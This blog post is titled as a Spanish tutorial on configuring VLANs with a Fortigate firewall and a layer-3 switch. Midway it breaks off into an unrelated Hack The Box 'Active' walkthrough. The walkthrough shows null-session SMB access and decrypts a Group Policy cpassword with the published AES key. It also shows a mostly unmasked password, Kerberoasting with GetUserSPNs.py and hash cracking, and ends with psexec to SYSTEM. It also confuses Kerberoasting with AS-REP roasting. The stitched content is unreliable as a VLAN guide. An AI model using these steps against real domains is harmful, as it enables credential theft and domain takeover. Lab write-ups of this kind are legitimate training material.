---
title: "VLANS en Fortigate"
layout: post
---
![Fortigate](/assets/images/Vlan1.png)


<h2>Presentación</h2>
En esta ocasion estaremos configurando un Firewall Fortigate junto a un Switch de capa 3, diferentes Vlans, para la separacion logica del trafico, en otro post estaremos presentando que es una VLAN y para que se utilizan asi como sus beneficios. 

- PC1 pertenece a la VLAN-ID 101 Alumnos --> 172.21.0.0/24
- PC2 pertenece a la VLAN-ID 102 Docentes --> 172.22.0.0/24
- PC3 pertenece a la VLAN-ID 103 Administradores --> 172.23.0.0/24

En Fortinet es posible utilizar la misma interfaz fisica para la creacion y trafico de diferentes VLANs, ya que pemite identificar el trafico con el VLAN-ID, y separar asi la interfaz fisica de manera logica, en una o mas interfaces logicas, a traves del tag frame 802.1q agregado que permite identificarlas (VLAN-ID). 

<h2>Reconocimiento</h2>
En la imagen tenemos un Fortigate de cara al internet (_Aunque la etiqueta LAN, se me quedo encima de la nube_ 😑) este fortigate haciendo la funcion de _edge firewall_ o firewall de perimetro se encarga del procesar el trafico que proviene de la red interna hacia internet y vice-versa, en este caso de las diferentes VLANS _Docentes, Alumnos y Administradores_ estos nombres para las diferentes son intencionalmente seleccionados para presentar unos de los mayores beneficios de la utilizacion de VLANS, y es que crear VLANS nos permite crear diseños más flexibles que agrupen a los usuarios por departamento, o por grupos que trabajan en lugar de por su ubicación física, y que como medida de seguridad nos permita implementar la aplicación de diferentes políticas de seguridad por VLANs.
  
<h2>VLANs</h2>
Crear, nombrar y asignar vlans es un proceso sencillo, como te mostrare a continuacion, y ya en otro post ampliaremos sobre mas atributos configurables con relacion a las vlans.

Lo primero que hay que hacer es entrar o habilitar el modo de configuracion, para eso ejecutamos los comandos: 

{% highlight bash %} enable {% endhighlight %}
{% highlight bash %} configure terminal {% endhighlight %}

<h2> Creacion de VLAN Switch capa 3</h2>

Una vez dentro del modo de configuracion que es posible identificar porque el terminar ahora nos anade (config)#.
![Fortigate](/assets/images/all vlans.png)

Es simplemente utilizar los comandos:

{% highlight bash %} vlan 101 {% endhighlight %} Donde el 101 es simplemente el ID de las vlans que habiamos especficado al principio, y entramos al modo de configuracion de vlan (config-vlan)#
{% highlight bash %} name docentes {% endhighlight %} Donde docentes es simplemente el nombre de las vlans.

<h2> Asignar VLANs a diferentes interfaces </h2>

Para esto volvemos al modo de configuracion de terminal(config)#
```
interface gigabitEthernet 0/1
switchport mode acess
switchport access vlan 101

```

Con smbclient haciendo uso de un null session accedimos a listar dicho directorio y su contenido.
{% highlight bash %}
smbclient //10.10.10.100/Replicacion -U ""%""
{% endhighlight %}



Luego de navegar por el directorio policies en busca de algo interesante y observando cada archivo hasta dar con el archivo groups.xml, que según el siguiente article de [Hacking-Article][Hacking-Article] es creado como consecuencia de la configuración de Group Policy Preference, en la que permiten a un administrador crear policies e instalar aplicaciones a través de Group Policy. Y sobre la cual se guarda una contraseña encriptada en formato _cpassword_, y de la cual Microsoft publicó la llave, como podemos observar en el siguiente artículo, [Microsoft][Microsoft], trasladamos el contenido de dicha carpeta a nuestra carpeta content y efectivamente, como se puede observar, obtenemos las credenciales del usuario SVC_TGS:

{% highlight bash %} <?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups> {% endhighlight %}

Desencriptamos la contraseña con el uso de la herramienta gpp-decrypt:

![Ative HTB](/assets/images/ggp.png)

también podemos hacer uso de el siguiente one-liner ya que conocemos la llave como mencionamos anteriormente:
{% highlight bash %} 
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 
{% endhighlight %}

<h2>Validación de credenciales</h2>

Utilizamos la herramienta crackmapexec.py del poderoso _impacket_ para verificar la autenticidad de dicho usuario en el dominio **active.htb**, las cuales resultaron ser válida aunque no obtuvimos un (Pwned!) e intentamos verificar si podiamos loguearnos a traves de winrm, pero no fue así. 

![Ative HTB](/assets/images/gpp.png)

**Nota** desde aqui podemos visualizar la flag del user, haciendo uso de smbclient y navegando entre directorios :)

{% highlight bash %} smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingSt----8 {% endhighlight %}

Pero teniendo un usuario y contraseña, se nos hace posible realizar un Kerberoasting attack, el cual TCM Security explica detallamente, que nos _dumpea_ los krbasrep5 hashes de las cuentas que tienen _Kerberos pre-authentication deshabilidata_ pero que explico con más detalle en el siguiente artículo, sobre mis apuntes. 
Para esto utilizamos la herramienta _GetUserSPNs.py_, del poderoso impacket 🏅  

{% highlight bash %} GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS {% endhighlight %}

obtenemos el hash NTLMv2, enviamos a un archivo de texto y utilizamos John The Ripper, para obtener la credencial en texto plano.

![Ative HTB](/assets/images/hash.png)

y ya obteniendo credenciales de administrador como nos muestra la primera línea del output del GetUserSPNs.py, y contraseña nos logueamos en el sistema. 

![Ative HTB](/assets/images/psexec.png)

Ya siendo Nt Authority\System, a buscar las flags.
Que he decidido mostrar solo si existe algún paso más para llegar a ellas, no que tan solo sea navegar entre directorios como es este el caso, para poder verla. 

🖱️_by:_ *@DaVinciRoot*

[Hacking-Article]: https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/
[Microsoft]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0
